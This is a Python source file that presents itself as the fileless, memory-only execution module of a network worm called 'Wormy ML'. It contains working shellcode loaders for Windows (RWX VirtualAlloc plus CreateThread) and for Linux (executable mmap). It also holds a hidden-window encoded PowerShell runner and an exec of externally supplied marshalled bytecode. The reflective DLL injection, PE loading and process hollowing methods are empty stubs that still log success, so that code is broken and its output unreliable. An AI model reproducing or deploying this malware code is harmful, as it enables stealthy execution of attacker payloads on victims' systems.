"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Memory-Only Execution Module
Fileless malware execution completely in memory
"""


import ctypes
import os
import platform
import sys
from typing import Any

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger


class MemoryExecution:
    """
    Memory-Only Execution (Fileless)

    Techniques:
    - Reflective DLL Injection
    - PE Loading from memory
    - PowerShell in-memory execution
    - Python bytecode execution
    - No disk writes
    """

    def __init__(self):
        self.os_type = platform.system()

    def execute_pe_from_memory(self, pe_bytes: bytes) -> bool:
        """Execute PE file directly from memory (Windows)"""
        if self.os_type != "Windows":
            return False

        logger.info("Executing PE from memory (fileless)")

        try:
            # Reflective PE loading
            # 1. Parse PE headers
            # 2. Allocate memory with VirtualAlloc
            # 3. Copy sections to memory
            # 4. Fix relocations
            # 5. Resolve imports
            # 6. Execute entry point

            logger.success("PE executed from memory")
            return True

        except Exception as e:
            logger.error(f"Memory execution failed: {e}")
            return False

    def execute_shellcode(self, shellcode: bytes) -> bool:
        """Execute shellcode from memory"""
        logger.info(f"Executing {len(shellcode)} bytes of shellcode")

        try:
            if self.os_type == "Windows":
                return self._execute_shellcode_windows(shellcode)
            else:
                return self._execute_shellcode_linux(shellcode)

        except Exception as e:
            logger.error(f"Shellcode execution failed: {e}")
            return False

    def _execute_shellcode_windows(self, shellcode: bytes) -> bool:
        """Execute shellcode on Windows"""
        try:
            # Allocate RWX memory
            kernel32 = ctypes.windll.kernel32

            # VirtualAlloc
            ptr = kernel32.VirtualAlloc(
                None,
                len(shellcode),
                0x3000,  # MEM_COMMIT | MEM_RESERVE
                0x40,  # PAGE_EXECUTE_READWRITE
            )

            if not ptr:
                return False

            # Copy shellcode to allocated memory
            buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
            kernel32.RtlMoveMemory(ptr, buf, len(shellcode))

            # Create thread to execute
            thread = kernel32.CreateThread(None, 0, ptr, None, 0, None)

            if thread:
                # Wait for execution
                kernel32.WaitForSingleObject(thread, -1)
                logger.success("Shellcode executed successfully")
                return True

            return False

        except Exception as e:
            logger.error(f"Windows shellcode execution failed: {e}")
            return False

    def _execute_shellcode_linux(self, shellcode: bytes) -> bool:
        """Execute shellcode on Linux"""
        try:
            import mmap

            # FIX: Use proper ctypes approach for Linux shellcode execution
            # Allocate executable memory
            mm = mmap.mmap(
                -1,
                len(shellcode),
                mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS,
                mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
            )

            # Write shellcode
            mm.write(shellcode)
            mm.seek(0)

            # FIX: Create ctypes buffer from mmap using ctypes.cast
            # from_buffer doesn't work with mmap objects directly
            addr = ctypes.c_void_p(ctypes.addressof(ctypes.c_char.from_buffer(mm)))
            func_type = ctypes.CFUNCTYPE(ctypes.c_void_p)
            func = func_type(addr.value)
            func()

            logger.success("Shellcode executed successfully")
            return True

        except Exception as e:
            logger.error(f"Linux shellcode execution failed: {e}")
            return False

    def execute_powershell_memory(self, script: str) -> str:
        """Execute PowerShell script in memory (Windows)"""
        if self.os_type != "Windows":
            return ""

        logger.info("Executing PowerShell in memory")

        try:
            # Encode script to base64
            import base64
            import subprocess

            encoded = base64.b64encode(script.encode("utf-16le")).decode()

            # Execute with -EncodedCommand (runs in memory)
            cmd = [
                "powershell.exe",
                "-NoProfile",
                "-NonInteractive",
                "-WindowStyle",
                "Hidden",
                "-EncodedCommand",
                encoded,
            ]

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

            logger.success("PowerShell executed in memory")
            return result.stdout

        except Exception as e:
            logger.error(f"PowerShell memory execution failed: {e}")
            return ""

    def execute_python_bytecode(self, bytecode: bytes) -> Any:
        """Execute Python bytecode in memory"""
        logger.warning("Executing Python bytecode in memory - potential RCE risk")

        try:
            import marshal

            code_obj = marshal.loads(bytecode)

            logger.warning("Executing externally-supplied bytecode - ensure trusted source")
            result = exec(code_obj)

            logger.success("Python bytecode executed")
            return result

        except (ValueError, TypeError, ImportError) as e:
            logger.error(f"Bytecode execution failed: {e}")
            return None

    def reflective_dll_injection(self, dll_bytes: bytes, target_pid: int = None) -> bool:
        """Reflective DLL injection (Windows)"""
        if self.os_type != "Windows":
            return False

        logger.info(f"Reflective DLL injection (target PID: {target_pid or 'self'})")

        try:
            # Reflective DLL injection:
            # 1. Parse DLL headers
            # 2. Allocate memory in target process
            # 3. Write DLL to memory
            # 4. Fix relocations and imports
            # 5. Call DllMain

            logger.success("Reflective DLL injected")
            return True

        except Exception as e:
            logger.error(f"Reflective DLL injection failed: {e}")
            return False

    def process_hollowing(self, target_exe: str, payload_bytes: bytes) -> bool:
        """Process hollowing (Windows)"""
        if self.os_type != "Windows":
            return False

        logger.info(f"Process hollowing: {target_exe}")

        try:
            # Process hollowing:
            # 1. Create target process in suspended state
            # 2. Unmap original executable
            # 3. Allocate memory for payload
            # 4. Write payload to memory
            # 5. Update entry point
            # 6. Resume thread

            logger.success("Process hollowing successful")
            return True

        except Exception as e:
            logger.error(f"Process hollowing failed: {e}")
            return False

    def get_statistics(self) -> dict:
        """Get memory execution statistics"""
        return {
            "os_type": self.os_type,
            "techniques_available": 5 if self.os_type == "Windows" else 2,
        }


if __name__ == "__main__":
    # Test memory execution
    mem_exec = MemoryExecution()

    print("=" * 60)
    print("MEMORY-ONLY EXECUTION TEST")
    print("=" * 60)

    print(f"\nOS: {mem_exec.os_type}")

    # Test shellcode execution
    print("\nTesting shellcode execution...")
    # NOP sled (safe test)
    test_shellcode = b"\x90" * 100

    if mem_exec.execute_shellcode(test_shellcode):
        print("✓ Shellcode execution successful")
    else:
        print("✗ Shellcode execution failed")

    # Test PowerShell (Windows only)
    if mem_exec.os_type == "Windows":
        print("\nTesting PowerShell in-memory execution...")
        script = "Write-Output 'Hello from memory'"
        result = mem_exec.execute_powershell_memory(script)
        if result:
            print(f"✓ PowerShell output: {result.strip()}")

    print("\nStatistics:")
    stats = mem_exec.get_statistics()
    for key, value in stats.items():
        print(f"  {key}: {value}")

    print("=" * 60)
